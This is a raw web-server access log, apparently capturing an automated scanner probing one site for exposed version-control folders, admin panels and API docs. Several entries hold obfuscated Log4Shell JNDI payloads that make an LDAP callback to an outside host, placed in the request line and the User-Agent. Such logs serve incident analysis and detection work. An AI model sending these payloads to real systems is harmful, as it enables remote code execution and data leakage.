34.68.34.87 - - [16/Feb/2024:04:04:54 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:04:54 +0000] "GET /doesntexist-123 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:54 +0000] "\x16\x03\x01\x01^\x01\x00\x01Z\x03\x03fy\xB1\xBF\x9B\xBA\x04PU;\x93\xC0\x93\x9A\x10\xA0\x8BX\xFC\x00\x18B\xF0?W\xB9\x1A\xB2\x0B\x8D\x02\xC4\x00\x00\xC2\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA7\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\x00\xA6\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\x00m\x00\xC5\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\x00l\x00\xBF\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:54 +0000] "GET /.hg HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:04:54 +0000] "GET /doesntexist-123 HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:54 +0000] "\x16\x03\x03\x03v\x01\x00\x03r\x03\x03e\xCE\xDE\xE6\x82\xEF\x0F\x81\x9E\x10A\x1B\xBD1r\xB5\xDBR\xA3O\xECs\xD4\xE9\xFC\x94\x05\x84\x0F\xB66\x1E )\xD7g\xB8F\xF8\x98Rb\x19\xCA\xEC\x81:\xFB\x86\x9F[,!\xB0|]\xBB\xC0\x9D\x8EU\xD3\xBE\xBF\xEF\x02\xB2\x00\x00\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:04:54 +0000] "ZSDLKFJ2 /${${cyn5:-j}${f:0:u37n:-n}${9e:ruzi:-d}${b3:2daq:9yip:-i}${1qw:61:-:}${25:n:-l}${6:jm8:c:-d}${o3:xz:8:-a}${u3:-p}${m3:c3e:-:}${3u5e:r:-/}${4ubx:ucx:-/}${ztox:yqsn:ty3:-P}${g2:n:fx1:-A}${6lu:b8:jz:-l}${sgfl:-0}${cg:ev:-c}${z31e:6n4:--}${${j:d6:-s}${ya:-y}${ax6b:9:-s}${1k:fv:6n:-:}${pcfh:-j}${dhz:-a}${4hm:3u29:-v}${n:h:-a}${1xl:j:-.}${pw:4cx:-v}${lad:-e}${1xdn:hfqe:-r}${k:-s}${4:8qc:scq:-i}${4i3:-o}${csq:-n}}${6:nru:-.}${t0:p1:-2}${c:-5}${9do:o3:2d:-0}${t:mu:-1}${uk:1:qoa:-e}${q9:-7}${s:h:j1g:-0}${4f:ex:dy4:-8}${bua:krp:v9ln:-f}${w:h:-e}${4:64c:m7tu:-b}${0fri:xbt:tkd:-c}${d73:3hzb:-7}${72h:-6}${b:-8}${0d:l1u:okm4:-e}${ihmu:jgl:-2}${s:yj:-8}${bgv:9fl:od2x:-8}${g:o:3to:-3}${pfw:-e}${io:1du0:o:-e}${p6s:y1k:ia:-6}${c:8j:jt:-4}${4epn:-6}${azji:b:40n:-b}${h:-c}${nb:xl7:-f}${56wb:-a}${cgq:m0qc:u:-6}${h:-8}${x:-b}${u927:-3}${bi:8pc9:vt:-3}${cyrz:r7:-8}${6:b:-f}${4s29:j2f:-d}${cjq:pzg0:-9}${w:pq60:-0}${lbof:l:-e}${x0e:zf8:-2}${07b:13:-a}${8abh:l:dm:-.}${azh:-z}${e5g:cw:-.}${k79f:-7}${a:mnh2:5bq:-b}${e7t:-a}${1" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:04:54 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x02\xF4\xB9P/\xCBuj\xB5\x96\x89\x86\xC9\xF41\xF2N\xB5#\xF0$\x02\x01\xB1>\xA6>\xC6\xC9!\x97\xC4/\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.80 - - [16/Feb/2024:04:04:55 +0000] "GET /admin HTTP/1.1" 401 574 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:55 +0000] "\x16\x03\x01\x00\xF9\x01\x00\x00\xF5\x03\x03e\xCE\xDE\xE6\x82\xEF\x0F\x81\x9E\x10A\x1B\xBD1r\xB5\xDBR\xA3O\xECs\xD4\xE9\xFC\x94\x05\x84\x0F\xB66\x1E )\xD7g\xB8F\xF8\x98Rb\x19\xCA\xEC\x81:\xFB\x86\x9F[,!\xB0|]\xBB\xC0\x9D\x8EU\xD3\xBE\xBF\xEF\x00" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:55 +0000] "GET /.bzr HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:55 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x01\xAB)\xE8\x13\x8C\x83+\x112 \xE5\xE0K\xCB\xA6\xEC\xD6h\xAD\xCC\xFA*" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:04:55 +0000] "\x16\x03\x01\x01\xCB\x01\x00\x01\xC7\x03\x03)\xEF\x05\xD2\x00\x8C\xB1\x7F[\x0F.\xEEm@ n\xE9\x99\xD4\x80\x8A" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:04:56 +0000] "GET /admin HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:56 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x01z\xD7\x0E\x0B=\xCDT\x94=\xDC\xBD\x8A\x17(\x5C\xB3\xCE\xFB\x7F\xBF2\xD7M5\xD55Rw\x19\xC3).\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:04:56 +0000] "GET /admin HTTP/1.1" 308 269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:56 +0000] "GET /.svn HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:56 +0000] "GET /docs HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:56 +0000] "\x16\x03\x01\x00\xAF\x01\x00\x00\xAB\x03\x01\xE8\x94\xF9v2\xF8\xB5\x1A\xC0B\xED\x84p2\xD6\x95\xEAQ\x9C3\x8DE\x01\x98V6\x16\xEB\xA3\x82\x10\xB2\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:56 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:04:56 +0000] "PUT /${${ut0:l:-j}${bgl:xb8:4w80:-n}${8e:-d}${hn:-i}${h:-:}${apo3:hwoc:1:-l}${ecf:x4mw:-d}${y:-a}${cp7:x3:-p}${f2:jgw:-:}${v:-/}${yt:x:u76e:-/}${s58p:-P}${hr:-A}${l:ojp:-l}${tzan:oq49:bcy:-0}${wq:c4mw:2tv4:-c}${m:p:hj:--}${${7:uj8l:81v:-s}${x:rq87:l76r:-y}${d2uw:0qru:-s}${0:9b:p:-:}${berv:ok:-j}${g:-a}${z9u:-v}${a:s:-a}${80kf:0cl:z2:-.}${ljqx:-v}${yb:-e}${qi:-r}${yc:6xcj:4lw:-s}${e:ezv:-i}${4b69:-o}${q:-n}}${ux2y:-.}${x0q:-2}${lgp:gvjp:-5}${4:xso:ic:-0}${5a:-1}${j6:a6:-e}${as0:bgls:-7}${v93n:65ev:6l:-0}${2mr:-8}${yj:-f}${2lc:25t:-e}${qvk:-b}${0:fwsa:r:-c}${qgod:-7}${t:-6}${63z0:6:d:-8}${trhv:-e}${4vc:oavm:9b:-2}${b:-8}${7:tx:g6:-8}${e26:qe5:-3}${fxy:srb:3:-e}${hp:ithq:ym:-e}${jzto:-6}${8v7x:-4}${z3s:-6}${ev:k:mbdj:-b}${zrul:cys:-c}${ui6:fal:-f}${seq:-a}${1:34o:jf:-6}${8su:7ys:-8}${skbd:ce:-b}${ikq:82:-3}${g68b:e1gf:4aod:-3}${1:y:-8}${gu:h8yp:-f}${zcmp:-d}${4:-9}${in9d:-0}${ei3q:8x:8qr:-e}${ngx:n8x:-2}${sb6:s:cwq:-a}${yp50:mz:-.}${6:-z}${b:gc:-.}${kp:um:ks:-7}${p:-b}${gp:ry:0km8:-a}${akj0:-e}${gohf:-.}${cjw:l:-x}${e:kv5f:3sq:-y}${gmq:lxa:zr:-z}} HTTP/1.1" 404 146 "-" "${${crb:-j}${k56:fq9j:-n}${x6:jd9:b19y:-d}${t6k:p6fk:o:-i}${n2:-:}${3c:d:-l}${yoja:-d}${5bw:3j:cxn3:-a}${uy:3b:-p}${m:gr:-:}${qbid:8b:0f:-/}${d95:bi:du:-/}${7bef:7tw:v:-U}${h2:9yua:-A}${j8:-l}${28nz:-0}${fwhr:0lq:-c}${yv:ca6n:--}${${84za:q:e0ha:-s}${pmha:3s62:-y}${i2:-s}${b9:w:bum:-:}${jp0:-j}${u:2l8:f:-a}${43:3:-v}${29i:-a}${ag9h:-.}${za8c:-v}${uhgz:xig:ogqf:-e}${u62:-r}${bv:gsv2:16ez:-s}${k:f:n:-i}${yklz:s8:2u5c:-o}${mpl:h:-n}}${elfz:-.}${n:-2}${pq:p:-5}${6:c7z:5:-0}${rjvb:-1}${a9j:-e}${pk4u:-7}${2m:5:-0}${70f:b45s:9tpq:-8}${qz6:-f}${s:txn:-e}${6kig:-b}${8ap:fnd:8:-c}${0m:t:qia:-7}${0:16tj:-6}${pztv:1ni:-8}${5:x:-e}${v8m3:m4j:fr7t:-2}${j:-8}${o:-8}${l:-3}${pat3:-e}${t:-e}${a64c:-6}${ut1:k:c9k:-4}${pdmh:-6}${2il:-b}${f8zr:pjb:r78:-c}${2:-f}${sntv:u:-a}${dukq:-6}${tbci:-8}${8ta:hds:-b}${k:awg:-3}${5e6v:ji7:-3}${0j:qg5a:s4m:-8}${9f:-f}${8:b:8sn:-d}${i8s7:-9}${lgp3:7:fd8g:-0}${8oh:0v:-e}${0:0:arg:-2}${1r:k72y:3mw:-a}${su8y:t:-.}${8sfw:d12:vzt:-z}${3qw:149:-.}${xtsu:0t:-7}${d0:-b}${0:-a}${etx1:6:-e}${asx2:d:j0n:-.}${5:a:2l:-x}${l1:dhg:j1xg:-y}${qh53:x561:9:-z}}"
34.68.34.79 - - [16/Feb/2024:04:04:57 +0000] "GET /.svn/entries HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:57 +0000] "GET /graphql HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:57 +0000] "\x16\x03\x01\x01\xCB\x01\x00\x01\xC7\x03\x03\xAF\xDF\x10\xC5c\xBCFX\x93\xBALyeP\x12\xDA\xB4\x8D\xA71\xF3`\xD1\xF3M\xFFc<\xC0\xED\xC3\xD9 \xF3\x172\xFE\x0B\xAF\xFE^8\xDA|\xFBL\xE3\xC8'&Uvm\xF4he\x94\x87\xDD\xC0\xA1\xCD,Y\xFB\x00\xC8\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA7\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\x00\xA6\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\x00m\x00\xC5\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\x00l\x00\xBF\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:57 +0000] "GET /.svn/prop-base HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:57 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:57 +0000] "OPTIONS / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:57 +0000] "\x16\x03\x01\x01^\x01\x00\x01Z\x03\x03m\x149\xC2\xCC-\xD5\xF8P\xB2\xE0\x800\xAF\xB7^\x18]\x8A\xF8\x8B(\x80mh\xB3\x1A\xA8\xFF\x8E-\xC3\x00\x00\xC2\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA7\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\x00\xA6\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\x00m\x00\xC5\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\x00l\x00\xBF\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:57 +0000] "GET /.svn/text-base HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:58 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x02>\xC7\xAA\xBD\xFF)[\x0F\xCB\x06Dm\xA8\xED\xB9\xA9>\x8B\x85.`\xF6\xB3\x92\x98V#\x96n8\x87\xC6\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:04:58 +0000] "OPTIONS / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:58 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03 >\xD4?\xC0\x97\xCF\x87/\xA5\xDA\xE9\xF9\xF5\xE2\xF3\xEEbk\x1F\xD7\xF0\x92\xEFC\xA7'!\x99m\xDD\x80 (\x0Fg\xA88\x81F\xD0g\x90\xDE\x96\xD1+\x87\x00Gl\xEE\xB4\xA6\x1B\xF4\xDE\x10\xC8\x22\xAA\x1F\xB3\xA5\x99\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:04:58 +0000] "GET /.htaccess HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:04:58 +0000] "GET /assets/favicon.png HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:58 +0000] "GET / HTTP/1.1" 200 1116 "-" "Go-http-client/1.1"
34.68.34.66 - - [16/Feb/2024:04:04:58 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x01Bn&\x1D\x15,fv\xC1\x1F\xF9'\x9BeM$\xB2\xDDC\xD6MC\xE40\x09P8&\xA0n\x995\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:04:58 +0000] "GET /assets/favicon.png HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:04:58 +0000] "GET /.htaccess.bak HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:04:59 +0000] "GET / HTTP/1.1" 404 184 "-" "Go-http-client/1.1"
34.68.34.72 - - [16/Feb/2024:04:04:59 +0000] "GET /ui/favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:04:59 +0000] "GET /ui/favicon.ico HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:01 +0000] "GET /favicon.ico HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:01 +0000] "GET /static/images/favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:01 +0000] "OPTIONS / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:02 +0000] "GET /static/images/favicon.ico HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:02 +0000] "GET / HTTP/1.1" 403 118 "-" "Go-http-client/1.1"
34.68.34.79 - - [16/Feb/2024:04:05:02 +0000] "GET /rest HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:02 +0000] "GET /install HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:02 +0000] "GET /install HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:03 +0000] "GET /swagger HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:03 +0000] "\x16\x03\x03\x01\xC0\x01\x00\x01\xBC\x03\x03nH\xAA\xDC\xE5C\x01\x11\xA4\x0F\xD3\x9D:E\xDEk\x0Eq\xAC\xEC5\x9A;\x8EH\x9DI\xA2\xC8\x0C:\xFC \x92\x0C\xF3\xF1\xD5~\xDB\xC9\x18\x85\xEBhn'\xE9E\xA8\xBA\xEBW\xC2\xFE\xB5rM\xB2\xA8\xB2\x06\xDD\xE4w\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:03 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:03 +0000] "GET /swagger/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:03 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:03 +0000] "\x16\x03\x03\x01\xC0\x01\x00\x01\xBC\x03\x034@\x9F*#\xFE\xE1\xFA\x97\x8B\x8C\xD4\xCA\x0CTB$uZ%\xBB\xE5%\x814\x18_\xCE\xBEB\x00\xBE 7\xF9\x8C\xAF\x5C\xB4S\x9Ee\xF3\xD3\xE5\xC3\xB3\xD7\xDA\xA2\x02\xE8q^\xFC\xC8\x1A\xBC\x86\xD4t\xB9D\x223\x00\x8A\x00\x05\x00\x04\x00\x07\x00\xC0\x00\x84\x00\xBA\x00A\x00\x9D\xC0\xA1\xC0\x9D\x00=\x005\x00\x9C\xC0\xA0\xC0\x9C\x00<\x00/\x00" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:04 +0000] "GET /swagger-resources HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:04 +0000] "GET /error.json HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:04 +0000] "\x16\x03\x03\x01q\x01\x00\x01m\x03\x03\x89\xCE=\x8B\xC6\xC2\x96\xDE\x8A\x9A4\xDB\xE9\xCC\x8D\xD2\x8B6\x09\xA7{\xE7I\x9B\xD0<\xE0\x80\x00-\x08\xE8 p\xCAR3\xC1\xB4\xA4\xFER%0\xB9\x19s\x0F\x93\x93\x16E\x1A\xC0l\x88G\xD3\xC0\x0B\xDFn\xDBb\xCE\x00F\xC0\x12\xC0\x07\xCC\x14\x13\x01\x13\x02\xCC\xA9\xC0s\xC0r\xC0,\xC0\xAF\xC0\xAD\xC0$\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:04 +0000] "GET /error.json HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:05 +0000] "\x16\x03\x03\x01c\x01\x00\x01_\x03\x03\x04\x92\xEFqy\xD6\xDE\xC9\x86\xCC/R\x8F\x7F\xA8\xA86\x87X\x8E\x9B+\xD45\x01\xC1\xC0mS\x01\xBA\x9F \xB9\x5C\xDE\x17p\x87wwx\xD1\xE6\xB0\xBBB\x1B\xBB-Q\x9C\xDE\xD6m\xB2\x89P\x13\xFF\x1A\x85\x18\xF10\x00D\xC0\x13\xC0'\xC0/\xC0\x14\xC0(\xC00\xC0`\xC0a\xC0v\xC0w\xCC\xA8\x13\x05\x13\x04\x13\x03\xCC\x13\xC0\x11\x00" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:05 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:05 +0000] "GET /swagger-ui HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:05 +0000] "\x16\x03\x03\x01\xB4\x01\x00\x01\xB0\x03\x03\xC4O9[LtF\x1Ad'\xC4A\x8Bt\x0C\x9D\xB5\xCE\xD5\x0E\xFB\x93;q\xF5\xA07<Z\xB0\x96\xF0 \x17\x86)#\x82\xFF\xE8)\xFE\xD9\xFC\xFDpL\x9E#\xF4\xC1\xB1i\x81\x0F\x1Ea\x1E6\x929\x90\x09\xC9|\x00\x8C\xBA\xBA\xC0\x12\xC0\x13\xC0\x07\xC0'\xCC\x14\xC0/\x13\x01\xC0\x14\x13\x02\xC0(\xCC\xA9\xC00\xC0s\xC0`\xC0r\xC0a\xC0,\xC0v\xC0\xAF\xC0w\xC0\xAD\xCC\xA8\xC0$\x13\x05\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:06 +0000] "OPTIONS / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
